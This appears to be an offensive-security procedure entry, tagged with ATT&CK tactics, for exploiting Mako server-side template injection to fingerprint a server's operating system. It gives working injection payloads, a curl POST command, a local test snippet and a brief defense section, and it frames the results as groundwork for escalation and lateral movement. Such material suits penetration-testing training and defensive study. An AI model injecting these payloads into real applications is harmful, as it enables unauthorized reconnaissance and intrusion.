---
id: b9287f9e-2aca-4a1b-b1db-d604f65b8005
name: Mako-SSTI-OS-Information-Gathering
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:40.096701+00:00'
updated_at: '2024-01-01T00:00:00Z'
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - '[[techniques/Command-Line Interface|T1059 - Command-Line Interface]]'
  - '[[techniques/Scripting|T1064 - Scripting]]'
sub_techniques: []
tags:
  - ssti
  - mako
  - server-side-template-injection
  - os-gathering
  - python
commands:
  - '[[commands/print-mako-os-module-path]]'
platforms:
  - web-applications
  - linux
  - python
tools: []
validated: true
---

# Mako-SSTI-OS-Information-Gathering

## Summary

This procedure exploits Server-Side Template Injection (SSTI) vulnerabilities in the Mako templating engine to access the Python 'os' module and gather operating system information, such as the OS name, version details, architecture, and module paths. It is useful for reconnaissance during web application assessments to fingerprint the server environment without full remote code execution.

## Description

Mako is a Python-based templating engine commonly used in web frameworks like Pyramid or Flask for dynamic content rendering. SSTI occurs when user input is unsafely interpolated into templates, allowing injection of Python expressions via ${...} syntax. The TemplateNamespace provides direct access to Python modules like 'os', enabling information disclosure. For example, injecting ${os.name} reveals the platform ('posix' for Unix-like systems), while more advanced payloads access internal structures for module paths. This technique targets web applications where templates process user data, such as search queries or user-generated content. Success depends on the application's configuration; restricted namespaces limit access. Outcomes include OS fingerprinting to tailor further exploits, like privilege escalation or lateral movement.

## Requirements

1. A vulnerable Mako template endpoint where user input is rendered without escaping (e.g., via GET/POST parameters).
2. Network access to the target web application.
3. Tools for crafting and sending HTTP requests, such as curl or a proxy like Burp Suite.
4. Basic understanding of Python expressions and Mako syntax.

## Defense

- Enforce strict input validation and sanitization to block template syntax like ${...}.
- Configure Mako with strict_undefined=True or custom namespaces to restrict access to sensitive modules like 'os'.
- Implement runtime monitoring for template errors or unusual Python executions in application logs.
- Deploy Web Application Firewalls (WAFs) tuned to detect SSTI patterns, such as module references or attribute accesses.

## Objectives

1. Confirm SSTI vulnerability and access to the 'os' module.
2. Extract OS platform details (name, version, architecture) for server fingerprinting.
3. Identify Python 'os' module path to infer environment and potential escalation paths.

## Instructions

### Step 1: Confirm Basic OS Module Access

**Context**: Begin with a minimal payload to reference the 'os' module, verifying if the TemplateNamespace allows direct imports. This low-risk test confirms SSTI without revealing sensitive data.

**Code** ([[codes/Mako-SSTI-OS-Module-Reference]]):

```python
os
```

Inject the payload `${os}` into the vulnerable template parameter (e.g., append to a URL query or POST body field that gets rendered by Mako).

> This expression loads and displays the 'os' module. If the application renders it, SSTI is confirmed, as restricted templates would error or ignore it.

**Expected Output**: The HTTP response body includes something like `<module 'os' (built-in)>`, indicating successful module access.

### Step 2: Gather Specific OS Details

**Context**: With access confirmed, query 'os' attributes for targeted reconnaissance. This step provides actionable intel like platform type, avoiding shell commands to stay stealthy.

Inject the following payloads into the same vulnerable parameter:

- `${os.name}` to get the OS platform.
- `${os.sys.platform}` for a more descriptive platform string.
- `${os.uname()}` (on Unix-like systems) for full details including kernel version and machine architecture.

Example using curl to test:

```bash
curl -X POST 'http://target.com/vulnerable' -d 'input=${os.name}'
```

> These attributes are read-only properties of the 'os' module. Use them to map the environment: 'posix' suggests Linux/Unix, 'nt' indicates Windows. uname() returns a namedtuple with sysname, release, etc., aiding in exploit selection.

**Expected Output**: For `${os.name}`, response shows 'posix'. For `${os.uname()}`, a tuple like `uname_result(sysname='Linux', release='5.15.0-56-generic', version='#62-Ubuntu SMP', machine='x86_64')`.

### Step 3: Extract OS Module Path

**Context**: Reveal the 'os' module's file path to understand the Python installation and version, which can guide further Python-based attacks or confirm the runtime environment.

**Command** ([[commands/print-mako-os-module-path]]):

```python
print(Template("${self.module.cache.util.os}").render())
```

First, execute this command locally to validate the payload string `${self.module.cache.util.os}`, which accesses the 'os' module via Mako's internal cache.

Then, inject `${self.module.cache.util.os}` directly into the vulnerable template parameter.

> The local render test ensures the payload syntax is correct. On the server, it bypasses direct import restrictions by navigating Mako's module cache. This discloses the Python lib path, e.g., revealing Python 3.10 usage.

**Expected Output**: Local execution: `<module 'os' from '/usr/lib/python3.10/os.py'>`. Server response: The same module path string in the rendered output.

**Code** ([[codes/Test-Mako-Payload-OS-Module-Render]]):

```python
print(Template("${self.module.cache.util.os}").render())
```

> This code snippet is used for the local validation in this step.
